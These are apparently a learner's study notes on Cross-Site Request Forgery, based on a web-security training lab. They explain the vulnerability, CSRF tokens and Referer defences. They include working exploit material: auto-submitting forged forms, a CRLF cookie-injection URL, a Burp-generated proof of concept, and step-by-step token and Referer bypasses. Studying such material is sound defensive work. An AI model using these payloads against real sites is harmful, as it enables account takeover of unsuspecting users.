# Cross Site Request Forgery

![CSRF.png](Cross%20Site%20Request%20Forgery%20655c2d4b43c24ae880a7957d59c60c70/CSRF.png)

## What is CSRF

- it is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform.
- it allows an attacker to partly circumvent the same origin policy.

## impact

- in a successful `CSRF` attack, the attacker cause the victim user to carry out an action unintentionally.
- for example: changing email, password , make funds transfer etc.
- if the victim user is admin then attacker may able to take full control of all the application's data and functionality.

## How CSRF work

- **A relevant Action:** there is an action within the application that the attacker has a reason to induce. like changing user's password or change permission for other user if victim have admin privileged.
- **Cookie-based session Handling:** performing the action involves issuing one or more HTTP requests, and the application relies on session cookie to identify the user who has made the requests.
- **No unpredictable request parameters:** The request that perform the action do not contain any parameters whose values the attacker cannot determine or gauss. example: user need to enter their old password in order to change their password then attacker needs to know existing password.

`example:`

```
POST /email/change HTTP/1.1
Host: vuln.web.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=fejrsdnrmf43u6t3yn74923

email=attacker@haceked.com

```

This meets the conditions required for CSRF

- the action of changing the email address on a user's account and take control of the user's account.
- The application uses a session cookie to identify which user issued the request, there are no other tokens or mechanisms in place to track user session
- The attacker can easily determine the valued of the request paramter that are need to perform the action

```
<html>
  <body>
    <form action="<https://vuln.web.com/change?email=attacker@hacked.com>" method="POST">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

```

attacker host this page in their application and when victim visit attacker's application the automatic script run and attacker successfully change victim's email to his own mail and take full control of the account.

## How to Construct a CSRF attack

- manually creating HTML needed for `CSRF exploit` can be cumbersome, particularly where the desired contains large number of parameters , The easiest way to construct CSRF exploit is using `CSRF POC generator` that is built in feature in BURP Suite Professional
- select any request/ right click and go to `engagement tools` `Generate CSRF POC`
- copy the generated web page, view it in another browser that is logged in to the vulnerable web site, and test whether the intended request is issued successfully and the desired action occurs.

## How to Deliver a CSRF exploit

- delivery mechanisms for cross-site request forgery attacks are essentially the same as for `reflected XSS`
- normally attacker store malicious HTML file onto a web app they control. and when victim visit that web exploit has been triggers
- some time `csrf parameter` is requesting in `GET` and their is `XSS` vulnerability then then it is easy to exploit it.

```
<img src="<http://vulb.web.com/change?email=hacker@hack.com>">

```

# XSS vs CSRF

- **XSS:** allows an attacker to execute arbitrary java script within the browser of a victim user
- **CSRF:** allows an attacker to induce a victim user to perform action that they do not intend to do.
- CSRF often only applies to a subset of action that a user able to perform.
- CSRF can be describe as a "one-way" vulnerability , in that the attacker can induce the victim to issue an HTTP request, but they can not retrieve the response from that request.
- Conversely , a Successful XSS is "two-way" in that the attacker's injected script can issue arbitrary request, read the response and exfiltrate data to an external domain.

## Can CSRF Tokens prevent XSS attacks

Some XSS attacks can indeed be prevented through effective use of CSRF tokens. Consider a simple `reflected XSS` vulnerability that can be trivially exploited like this:

```
<https://insecure-website.com/status?message=><script>/*+Bad+stuff+here...+*/</script>

```

Now, suppose that the vulnerable function includes a CSRF token:

```
<https://insecure-website.com/status?csrf-token=CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz&message=><script>/*+Bad+stuff+here...+*/</script>

```

some important caveats arise here

- If a `reflected XSS` vulnerability exists anywhere else on the site within a function that is not protected by a CSRF token, then that XSS can be exploited in the normal way.
- If an exploitable `XSS` vulnerability exists anywhere on a site, then the vulnerability can be leveraged to make a victim user perform actions even if those actions are themselves protected by `CSRF tokens`. In this situation, the attacker's script can request the relevant page to obtain a valid `CSRF token`, and then use the token to perform the protected action.
- CSRF tokens do not protect against `stored XSS` vulnerabilities. If a page that is protected by a CSRF token is also the output point for a `stored XSS` vulnerability, then that XSS vulnerability can be exploited in the usual way, and the XSS payload will execute when a user visits the page.

# CSRF Tokens

## What are CSRF Tokens

- it is unique, secret, unpredictable value that is generated by the server-side application and transmitted to the client in a such a way that it is include in a subsequent HTTP request made by the client
- server validate the token and accept or reject the request of the client
- CSRF token prevent CSRF attack by making it impossible for an attacker to construct a fully valid HTTP request suitable for feeding to a victim user.

## How should CSRF token be generated

- it should contain significant entropy and be strongly unpredictable, with same properties as session token

## How CSRF token should transmitted

- it is transmitted the token to the client within a hidden field of an HTML form that is submitted using the POST method.
- the token will then be included as a request parameter when the form is submitted

```
<input type="hidden" name="csrf-token" value="ejfkewh5u3485uh93487u5tfbw8456y8h57394ieuhi"
 />

```

- Some applications transmit CSRF tokens within a custom request header. This presents a further defense against an attacker who manages to predict or capture another user's token, because browsers do not normally allow custom headers to be sent cross-domain.

## How CSRF tokens validated

- CSRF token should be stored server-side within the user's session data.
- when a subsequent request is received that require validation, server-side application should verify that the request includes a token which matches the value that was stored in the user's session.
- and if token matches, application grant access to client

# Common CSRF vulnerabilities

## Validation of CSRF token Depends on Request Method

- Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.
- in this situation attacker Switch to the `GET` method to bypass the validation

```
GET /email/change?email=atttacker@ha.net HTTP/1.1
Host: Vulnerable-website.com
Cookie: session=ewuy5hf43yh4f9837bry

```

## Validation of CSRF token depends on token being present

- some application correctly validate the token when it is present but skip the validation if the token is omitted or remove.
- in this situation attacker remove the entire parameter containing the token to bypass the validation

```
POST /email/change HTTP/1.1
Host: vuln.web.com
Content-Type: application/x-www-form-urlencodede
Content-Lenth: 23(length of paramter that we need to submit)
cookie: session=wsdfvfr435re

email=dk@dk9510.net

```

## CSRF Token is not tied to the user session

- some application do not validate that the token belongs to the same session as the user who is making the request.
- instead the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool.
- in this situation attacker obtain their own token by logging in the application and user it for `CSRF attackexample Lab:`
1. With your browser proxying traffic through Burp Suite, log in to your account, submit the "Update email" form, and intercept the resulting request.
2. Make a note of the value of the `CSRF token`, then drop the request.
3. Open a private/incognito browser window, log in to your other account, and send the update email request into Burp Repeater.
4. Observe that if you swap the CSRF token with the value from the other account, then the request is accepted.
5. Create and host a proof of concept exploit as described in the solution to the `CSRF vulnerability with no defenses` lab. Note that the `CSRF tokens` are single-use, so you'll need to include a fresh one.

## CSRF token is tied to a non-session cookie

- in a variation on the preceding vulnerability, some applications do not tie the `CSRF` token to a cookie, but not to the same cookie that is used to track sessions.
- This can easily occur when an application employs two different frameworks, one for `session handling` and one for `CSRF pretection` which are not integrated together.

```
POST /email/change HTTP/1.1
Host: vuln-web.com
Content-Type: application/x-www-form-urlencoded
Content-Lenth: 56
Cookie: session=edsawe43wergfsdy24twr
csrfKey=jfdxrkw87ehrfiw4yer

csrf=kjdsruyhn4yreuhbv38ewsf4e&email=hello@hackers.net

```

- in this situation is harder to exploit but it is still vulnerable.
- if application contains any behavior that allows attacker to set a cookie in a victim's browsers, then attacker use their cookie that he got after logging in, leverage the cookie-setting behavior to place their cookie into the victim's browser and feed their token to the victim in CSRF attack
`example lab:`Soln
- Send the request to Burp Repeater and observe that changing the `session` cookie logs you out, but changing the `csrfKey` cookie merely results in the `CSRF token` being rejected. This suggests that the `csrfKey` cookie may not be strictly tied to the session.
- Open a private/incognito browser window, log in to your other account, and send a fresh update email request into Burp Repeater.
- Observe that if you swap the `csrfKey` cookie and `csrf` parameter from the first account to the second account, the request is accepted.
- Close the Repeater tab and incognito browser.
- Back in the original browser, perform a search, send the resulting request to Burp Repeater, and observe that the search term gets reflected in the Set-Cookie header. Since the search function has no CSRF protection, you can use this to inject cookies into the victim user's browser.
- Create a URL that uses this vulnerability to inject your `csrfKey` cookie into the victim's browser:`/?search=test%0d%0aSet-Cookie:%20csrfKey=your-key`
- Create and host a proof of concept exploit as described in the solution to the `CSRF vulnerability with no defenses` lab, ensuring that you include your `CSRF token`. The exploit should be created from the email change request.
- Remove the `script` block, and instead add the following code to inject the cookie:`<img src="$coki-injection-URL" onerror ="document.forms[0].submit()">NOTE:`here in `$cooki-injection-URL` is url from which we inject cookie for the user in their request so we successfully bypass `csrfKey` Cookie

## CSRF token is simply duplicated in a cookie

- some application do not maintain any server-side record of tokens that have beed issued, but instead duplicate each token within a cookie and a request parameter.
- when the subsequent request is validated, the application simply verifies that the token submitted in the request parameter is matches the value submitted in the cookie.
- this is also called `Double submit Defence against CSRF` and is advocated because it is somple to implement and avoids the need for any server-side state

```
POST /email/change HTTP/1.1
Host: vuln-web.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=sdmkjsy9hnieyhve8y;
csrf=jesdf748rueknarewehfb

csrf=jesdf748rueknarewehfb&email=hello@dk.net

```

**EXploit code:**

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="<https://ac441ffa1e9b108f808b1906006c00ce.web-security-academy.net/my-account/change-email>" method="POST">
      <input type="hidden" name="email" value="DK&#64;9510" />
      <input type="hidden" name="csrf" value="JgPNA6FsPgVwJm6uAYRgguGGox5BRLBQ" />
      <input type="submit" value="Submit request" />
    </form>
   <img src="<https://ac441ffa1e9b108f808b1906006c00ce.web-security-academy.net/?search=hello%0d%0aSet-Cookie:%20csrf=JgPNA6FsPgVwJm6uAYRgguGGox5BRLBQ>" onerror="document.forms[0].submit();"/>
  </body>
</html>

```

here also we have set-cookie-injection vuln that we set arbitrary cookie to the user

# Referer-based Defenses against CSRF

- some Application make use of `HTTP Referer` header to attempt to defend against CSRF attacks, Normally by verifying that the request originated from the application's own domain.
- this also can be bypassed

## validation of referer Depends on Header being present or not

- some application validate the referer header when it is present, but skip the validation if the header is omitted or removed
- in this situation, attacker can craft their CSRF exploit in a way that cause the victim user's browser to drop the `Referer:` header in the resulting request.
- there is various way to achieve this but easiest way is using `META` tag

```
<meta name="refferer" content="never"/>

```

## validation of Referer Can be Circumvented

- if the application validates that the domain in the `Referer` starts with expected value, then the attacker can place this as subdomain of their own domain.
- `http://vuln-web.com.attacker-web.com/csrf-attack`
- likewise if the application simply validates the `Referer` contains its own domain name, then it can be bypassed
- `http://attacker-web.com/csrf-attack?vuln-web.com`**Note:**
- Although you may be able to identify this behavior using Burp, you will often find that this approach no longer works when you go to test your proof-of-concept in a browser. In an attempt to reduce the risk of sensitive data being leaked in this way, many browsers now strip the query string from the `Referer` header by default.
- You can override this behavior by making sure that the response containing your exploit has the `Referrer-Policy: unsafe-url` header set (note that `Referrer` is spelled correctly in this case, just to make sure you're paying attention!). This ensures that the full URL will be sent, including the query string.
`NOte:`
- by default chrome and firefox blocks Referrer so we need to add header `Referrer-Policy: unsafe-url`